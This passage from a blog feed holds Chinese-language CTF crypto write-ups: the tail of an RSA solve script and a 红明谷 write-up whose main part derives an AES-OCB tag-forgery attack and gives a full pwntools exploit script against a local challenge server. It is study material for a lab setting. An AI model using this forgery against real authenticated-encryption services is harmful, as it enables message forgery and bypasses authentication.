267647155976378743685890593144685469708715653490308593667201283907775452606689307120817149553958120371639890271685148603015657241238590179583153694790949220206995033824074078242830758458739742301161015368049847345525661233185551949155450470189603595130241004416639482696460716023144193868351704190287775402159037407591606868297555272291534131071*x*y - 1177035497855139471300150596073079881470359423070664560562543221821780066461677777154411563960425838478371703085673516387654415520557027*y^2)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717</span> + <span class="number">1</span></span><br><span class="line">dq = <span class="number">636751972323</span></span><br><span class="line">q = (e * dq + k - <span class="number">1</span>) // k</span><br><span class="line">p = n // q</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-MRCTF2021-39-s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-MRCTF2021-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for MRCTF2021&amp;#39;</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for 红明谷 crypto</title>
    <link href="http://example.com/2021/04/04/Wp_for_%E7%BA%A2%E6%98%8E%E8%B0%B7_crypto/"/>
    <id>http://example.com/2021/04/04/Wp_for_%E7%BA%A2%E6%98%8E%E8%B0%B7_crypto/</id>
    <published>2021-04-03T17:26:50.000Z</published>
    <updated>2021-04-05T13:54:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-红明谷-39-s-crypto"><a href="#Writeup-for-红明谷-39-s-crypto" class="headerlink" title="Writeup for 红明谷&#39;s crypto"></a>Writeup for 红明谷&#39;s crypto</h1><p>不知道是为啥，只有一个难题，虽然巨难无比，但收获不小</p><h2 id="RSAattack"><a href="#RSAattack" class="headerlink" title="RSAattack"></a>RSAattack</h2><p>$e&#x3D;3$ $c$ 远小于 $n$ ，直接开方就完了</p><h2 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h2><p>和VNCTF的factor是一个题，换一下数据直接出</p><h2 id="babyFogery"><a href="#babyFogery" class="headerlink" title="babyFogery"></a>babyFogery</h2><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>加密模式为<a href="https://github.com/kravietz/pyOCB">AES.OCB</a>，服务器提供加密和解密功能，<code>getflag</code>的要求如下：</p><ul><li>associate_data为<code>from Alice</code></li><li>明文为<code>please_give_me_the_flag</code></li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>阅读整体代码，掌握AES.OCB模式的特点与加解密过程如下：</p><p>（本文只说明对该题有意义的函数与特点，如果想仔细了解请阅读<code>github</code>上的源代码）</p><blockquote><p>后文中 $E(),D()$ 表示AES.OCB内部的 $aes.encrypt(),aes.decrypt()$</p></blockquote><h4 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h4><p>AES.OCB在解密时会对 $tag$ 与 $cipher$ 进行认证，如果发现与加密时的不同，则不会返回解密后的 明文，所以这一点要求我们在伪造 $cipher$ 和同时要对 $tag$ 进行伪造，使得其通过认证检测，我们才能得到明文，才能保证连接不被中断</p><h4 id="pmac"><a href="#pmac" class="headerlink" title="pmac"></a><strong>pmac</strong></h4><p>是一种加密（或处理）<code>associate_data</code>的函数，其输出结果只与内部 $aes$ 和 $header$ 参数有关</p><h4 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a><strong>encrypt</strong></h4><p>AES.OCB加密函数，对于除去最后一块的前面所有明文块，其满足<br>$$<br>c_i&#x3D;2^i\cdot E(nonce) \bigoplus E(2^i\cdot E(nonce) \bigoplus m_i)<br>$$<br>而对与最后一块，其满足<br>$$<br>c_n&#x3D;m_n \bigoplus E(2^n\cdot E(nonce)\bigoplus len(0^n))<br>$$<br>而加密时的 $tag$ 与其他参数，满足<br>$$<br>checksum&#x3D;\bigoplus^n_{i&#x3D;1}m_i<br>$$<br>$$<br>tag&#x3D;E(3\cdot 2^n\cdot E(nonce)\bigoplus checksum)<br>$$<br>另外，如果 $header&gt;0$ ，则新的 $tag&#x3D;tag\bigoplus header$ ，此外，一个 $nonce$ 只能够被使用一次</p><h4 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a><strong>decrypt</strong></h4><p>AES.OCB解密函数，对于除去最后一块的前面所有明文块，其满足<br>$$<br>m_i&#x3D;D(c_i\bigoplus 2^i\cdot E(nonce)) \bigoplus 2^i\cdot E(nonce)<br>$$<br>而对与最后一块，其满足<br>$$<br>m_n&#x3D;c_n \bigoplus E(2^n\cdot E(nonce)\bigoplus len(0^n))<br>$$<br>解密时的 $checktag$ 与其他参数，满足<br>$$<br>checksum&#x3D;\bigoplus^n_{i&#x3D;1}m_i<br>$$<br>$$<br>checktag&#x3D;E(3\cdot 2^n\cdot E(nonce)\bigoplus checksum)<br>$$<br>同样的，如果 $header&gt;0$ ，则新的 $checktag&#x3D;checktag\bigoplus header$</p><p>如果 $cipher$ 或 $tag$ 被检测出被修改过，则直接返回 $(False,[])$ ，否则返回 $(True,[message])$</p><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>很显然，我们本地无法加密的原因是因为AES.OCB模式内部的 $aes$ 我们无法使用，另外在线的加密函数我们无法使得<code>associate_data</code>为<code>from Alice</code>，所以只要我们能够求出 $msg$ 所对应的 $E(msg)$ ，这个问题就会迎刃而解（任意加密攻击）</p><p>这里我们这样构造<br>$$<br>m_1&#x3D;len(0^n)&#x3D;15\times b’\x00’+b’\x80’~~~~~<br>m_2&#x3D;0&#x3D;16\times b’\x00’<br>$$</p><p>那么 $m_1$ 会被当作非最后一块加密<br>$$<br>c_1&#x3D;2\cdot E(nonce)\bigoplus E(2\cdot E(nonce)\bigoplus m_1)<br>$$</p><p>$$<br>c_2&#x3D;m_2\bigoplus E(4\cdot E(nonce)\bigoplus len(0^n))\<br>&#x3D;E(4\cdot E(nonce)\bigoplus len(0^n))<br>$$</p><p>随后调用解密函数时只提交 $c1$ ，此时会被当作最后一块解密，那么我们会发现<br>$$<br>m_1&#x3D;c_1\bigoplus E(2\cdot E(nonce)\bigoplus m_1) \<br>&#x3D;\underbrace{2\cdot E(nonce)\bigoplus E(2\cdot E(nonce)\bigoplus len(0^n))}_{c_1}\bigoplus E(2\cdot E(nonce)\bigoplus m_1)<br>$$<br>而我们构造的 $m_1&#x3D;len(0^n)$ ，那么显然 $m_1&#x3D;2\cdot E(nonce)$ ，此时，我们就能够轻松算出 $E(nonce)$ ！</p><p>但因为AES.OCB的认证特殊性，我们需要使得伪造 $tag$ 来通过认证检测，这里我们选择令 $header$ 为空，那么此时的<br>$$<br>checktag&#x3D;E(6\cdot E(nonce)\bigoplus 2\cdot E(nonce))\<br>&#x3D;E(4\cdot E(nonce))<br>$$<br>如何能得到这个玩意呢？</p><p>当我们再次稍微变化一下 $c_1&#x3D;c_1\bigoplus m1$ 后，我们发现此时<br>$$<br>checktag&#x3D;E(m_1\bigoplus 6\cdot E(nonce)\bigoplus 2\cdot E(nonce))\<br>&#x3D;E(m_1\bigoplus 4\cdot E(nonce))&#x3D;c_2<br>$$<br>也就是说，我们给在线 $decrypt$ 函数提供的数据分别为： $nonce$ 为加密时的 $nonce$ ， $tag$ 为 $c_2$ ， $c &#x3D; c_1$ ， $header$ 为空，这样就能够成功通过客户端的认证检查，并且得到 $2\cdot E(nonce)$ ，对 $times2$ 函数写个逆即可求得 $E(nonce)$</p><p>此时，我们即可对于任意的 $nonce$ ，都能得到其对应的 $E(nonce)$ ，但是对于任意的明文 $m$ ，并不能自如的完成任意加密，那么我们现在相当于已经有了 $nonce$ 与其对应的 $E(nonce)$ ，如何来完成任意加密的效果呢？</p><p>这里我们为了便于解释，我们记 $L&#x3D;E(nonce)$ 、$L’&#x3D;E(2\cdot L\bigoplus m_1)$ ，那么可以轻松算得 $L’&#x3D;c_1\bigoplus 2\cdot L$ ，我们再次使用客户端的 $encrypt$ 函数，但这次我们的 $nonce&#x3D;2\cdot L\bigoplus m_1$ ，$m&#x3D;message\bigoplus2\cdot L’$ ，那么 $c&#x3D;2\cdot L’\bigoplus E(message\bigoplus2\cdot L’\bigoplus2\cdot L’)$ ，我们就能轻松算出 $E(message)&#x3D;c\bigoplus 2\cdot L’$</p><p>我们将前面所有的过程看作一个函数，即使用一个 $nonce$ 名额，来得到我想要的 $aes.encrypt(message)$ ，那么此时所有的加密过程都可以在本地完成，直接在本地计算题目所需要的 $cipher$ 与 $tag$ ，直接打给服务器即可</p><p><img src="/img/babyForgerysuccess.png" alt="success"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">times2</span>(<span class="params">input_data,blocksize = <span class="number">16</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(input_data) == blocksize</span><br><span class="line">    output =  <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    carry = input_data[<span class="number">0</span>] &gt;&gt; <span class="number">7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_data) - <span class="number">1</span>):</span><br><span class="line">        output[i] = ((input_data[i] &lt;&lt; <span class="number">1</span>) | (input_data[i + <span class="number">1</span>] &gt;&gt; <span class="number">7</span>)) % <span class="number">256</span></span><br><span class="line">    output[-<span class="number">1</span>] = ((input_data[-<span class="number">1</span>] &lt;&lt; <span class="number">1</span>) ^ (carry * <span class="number">0x87</span>)) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(output) == blocksize</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">times3</span>(<span class="params">input_data</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(input_data) == <span class="number">16</span></span><br><span class="line">    output = times2(input_data)</span><br><span class="line">    output = xor_block(output, input_data)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(output) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back_times2</span>(<span class="params">output_data,blocksize = <span class="number">16</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(output_data) == blocksize</span><br><span class="line">    input_data =  <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    carry = output_data[-<span class="number">1</span>] &amp; <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output_data) - <span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">        input_data[i] = (output_data[i] &gt;&gt; <span class="number">1</span>) | ((output_data[i-<span class="number">1</span>] % <span class="number">2</span>) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    input_data[<span class="number">0</span>] = (carry &lt;&lt; <span class="number">7</span>) | (output_data[<span class="number">0</span>] &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(carry)</span></span><br><span class="line">    <span class="keyword">if</span>(carry):</span><br><span class="line">        input_data[-<span class="number">1</span>] = ((output_data[-<span class="number">1</span>] ^ (carry * <span class="number">0x87</span>)) &gt;&gt; <span class="number">1</span>) | ((output_data[-<span class="number">2</span>] % <span class="number">2</span>) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(input_data) == blocksize</span><br><span class="line">    <span class="keyword">return</span> input_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_block</span>(<span class="params">input1, input2</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(input1) == <span class="built_in">len</span>(input2)</span><br><span class="line">    output = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input1)):</span><br><span class="line">        output.append(input1[i] ^ input2[i])</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_bytes</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">input</span>,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;10000&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter username &gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Arbitrary_encrypt</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="comment"># to get aes.encrypt(msg)</span></span><br><span class="line"></span><br><span class="line">    num = <span class="built_in">bytearray</span>(os.urandom(<span class="number">16</span>))</span><br><span class="line">    <span class="comment"># encrypt &quot;\x00&quot;*15+&quot;\x80&quot;+&quot;\x00&quot;*16</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">    r.sendline(num.<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter message &gt; &quot;</span>)</span><br><span class="line">    m = <span class="built_in">bytearray</span>(<span class="string">b&quot;\x00&quot;</span>*<span class="number">15</span> + <span class="string">b&quot;\x80&quot;</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line">    r.sendline(m.<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;ciphertext: &quot;</span>)</span><br><span class="line">    cipher = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;tag: &quot;</span>)</span><br><span class="line">    tag = r.recvline(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># decrypt to solve L=E(nonce)</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">    r.sendline(num.<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter ciphertext &gt; &quot;</span>)</span><br><span class="line">    m0 = <span class="built_in">bytearray</span>(<span class="string">b&quot;\x00&quot;</span>*<span class="number">15</span> + <span class="string">b&quot;\x80&quot;</span>)</span><br><span class="line">    m1 = <span class="built_in">bytearray</span>(<span class="string">b&quot;\x00&quot;</span>*<span class="number">16</span>)</span><br><span class="line">    c0 = hex_to_bytes(cipher[:<span class="number">32</span>])</span><br><span class="line">    r.sendline(xor_block(c0,m0).<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter tag &gt; &quot;</span>)</span><br><span class="line">    c1 = cipher[<span class="number">32</span>:]</span><br><span class="line">    r.sendline(c1)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter associate data &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;message: &quot;</span>)</span><br><span class="line">    enc = xor_block(<span class="built_in">bytearray</span>(hex_to_bytes(r.recvline(<span class="literal">False</span>))),m0)</span><br><span class="line"></span><br><span class="line">    L = back_times2(enc)</span><br><span class="line">    LL = enc</span><br><span class="line">    LLL = xor_block(LL,c0)</span><br><span class="line">    <span class="comment"># print(L)</span></span><br><span class="line">    <span class="comment"># print(LL)</span></span><br><span class="line">    <span class="comment"># print(LLL)</span></span><br><span class="line">    <span class="comment"># L=L 2L=LL L&#x27;=LLL m0=m0</span></span><br><span class="line">    msg = <span class="built_in">bytearray</span>(msg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encrypt msg</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">    r.sendline(xor_block(LL,m0).<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter message &gt; &quot;</span>)</span><br><span class="line">    r.sendline(xor_block(msg,times2(LLL)).<span class="built_in">hex</span>()+m1.<span class="built_in">hex</span>())</span><br><span class="line">    r.recvuntil(<span class="string">&quot;ciphertext: &quot;</span>)</span><br><span class="line">    enc = <span class="built_in">bytearray</span>(hex_to_bytes(r.recvline(<span class="literal">False</span>))[:<span class="number">16</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> xor_block(enc,times2(LLL))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_pmac</span>(<span class="params">header, blocksize = <span class="number">16</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(header)</span><br><span class="line">    m = <span class="built_in">int</span>(<span class="built_in">max</span>(<span class="number">1</span>, math.ceil(<span class="built_in">len</span>(header) / <span class="built_in">float</span>(blocksize))))</span><br><span class="line">    offset = Arbitrary_encrypt(<span class="built_in">bytearray</span>([<span class="number">0</span>] * blocksize))</span><br><span class="line">    offset = times3(offset)</span><br><span class="line">    offset = times3(offset)</span><br><span class="line">    checksum = <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m - <span class="number">1</span>):</span><br><span class="line">        offset = times2(offset)</span><br><span class="line">        H_i = header[(i * blocksize):(i * blocksize) + blocksize]</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(H_i) == blocksize</span><br><span class="line">        xoffset = xor_block(H_i, offset)</span><br><span class="line">        encrypted = Arbitrary_encrypt(xoffset)</span><br><span class="line">        checksum = xor_block(checksum, encrypted)</span><br><span class="line">    offset = times2(offset)</span><br><span class="line">    H_m = header[((m - <span class="number">1</span>) * blocksize):]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(H_m) &lt;= blocksize</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(H_m) == blocksize:</span><br><span class="line">        offset = times3(offset)</span><br><span class="line">        checksum = xor_block(checksum, H_m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        H_m.append(<span class="built_in">int</span>(<span class="string">&#x27;10000000&#x27;</span>, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(H_m) &lt; blocksize:</span><br><span class="line">            H_m.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(H_m) == blocksize</span><br><span class="line">        </span><br><span class="line">        checksum = xor_block(checksum, H_m)</span><br><span class="line">        offset = times3(offset)</span><br><span class="line">        offset = times3(offset)</span><br><span class="line">    final_xor = xor_block(offset, checksum)</span><br><span class="line">    auth = Arbitrary_encrypt(final_xor)</span><br><span class="line">    <span class="keyword">return</span> auth</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_ocb_encrypt</span>(<span class="params">plaintext, header, nonce, blocksize = <span class="number">16</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> nonce</span><br><span class="line">    m = <span class="built_in">int</span>(<span class="built_in">max</span>(<span class="number">1</span>, math.ceil(<span class="built_in">len</span>(plaintext) / <span class="built_in">float</span>(blocksize))))</span><br><span class="line">    offset = Arbitrary_encrypt(nonce)</span><br><span class="line">    checksum = <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    ciphertext = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m - <span class="number">1</span>):</span><br><span class="line">        offset = times2(offset)</span><br><span class="line">        M_i = plaintext[(i * blocksize):(i * blocksize) + blocksize]</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(M_i) == blocksize</span><br><span class="line">        checksum = xor_block(checksum, M_i)</span><br><span class="line">        xoffset = Arbitrary_encrypt(xor_block(M_i, offset))</span><br><span class="line">        ciphertext += xor_block(offset, xoffset)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ciphertext) % blocksize == <span class="number">0</span></span><br><span class="line">    M_m = plaintext[((m - <span class="number">1</span>) * blocksize):]</span><br><span class="line">    offset = times2(offset)</span><br><span class="line">    bitlength = <span class="built_in">len</span>(M_m) * <span class="number">8</span></span><br><span class="line">    <span class="keyword">assert</span> bitlength &lt;= blocksize * <span class="number">8</span></span><br><span class="line">    tmp = <span class="built_in">bytearray</span>(blocksize)</span><br><span class="line">    tmp[-<span class="number">1</span>] = bitlength</span><br><span class="line">    pad = Arbitrary_encrypt(xor_block(tmp, offset))</span><br><span class="line">    tmp = <span class="built_in">bytearray</span>()</span><br><span class="line">    C_m = xor_block(M_m, pad[:<span class="built_in">len</span>(M_m)])</span><br><span class="line">    ciphertext += C_m</span><br><span class="line">    tmp = M_m + pad[<span class="built_in">len</span>(M_m):]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(tmp) == blocksize</span><br><span class="line">    checksum = xor_block(tmp, checksum)</span><br><span class="line">    offset = times3(offset)</span><br><span class="line">    tag = Arbitrary_encrypt(xor_block(checksum, offset))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(header) &gt; <span class="number">0</span>:</span><br><span class="line">        tag = xor_block(tag, my_pmac(header))</span><br><span class="line">    <span class="keyword">return</span> (tag, ciphertext)</span><br><span class="line"></span><br><span class="line">finalnonce = <span class="built_in">bytearray</span>(hex_to_bytes(<span class="string">&#x27;11&#x27;</span>*<span class="number">16</span>))</span><br><span class="line">finaltag,finalcipher = (my_ocb_encrypt(<span class="built_in">bytearray</span>(<span class="string">b&#x27;please_give_me_the_flag&#x27;</span>),<span class="built_in">bytearray</span>(<span class="string">b&#x27;from Alice&#x27;</span>),finalnonce))</span><br><span class="line"></span><br><span class="line">finaltag = finaltag.<span class="built_in">hex</span>()</span><br><span class="line">finalnonce = finalnonce.<span class="built_in">hex</span>()</span><br><span class="line">finalcipher = finalcipher.<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(finaltag)</span></span><br><span class="line"><span class="comment"># print(finalnonce)</span></span><br><span class="line"><span class="comment"># print(finalcipher)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter option &gt; &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter nonce &gt; &quot;</span>)</span><br><span class="line">r.sendline(finalnonce)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter ciphertext &gt; &quot;</span>)</span><br><span class="line">r.sendline(finalcipher)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter tag &gt; &quot;</span>)</span><br><span class="line">r.sendline(finaltag)</span><br><span class="line"></span><br><span class="line">flag = r.recvline()</span><br><span class="line"><span class="keyword">if</span>(<span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag):</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-红明谷-39-s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-红明谷-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for 红明谷&amp;#39;s crypto&quot;&gt;&lt;/a&gt;Writ</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
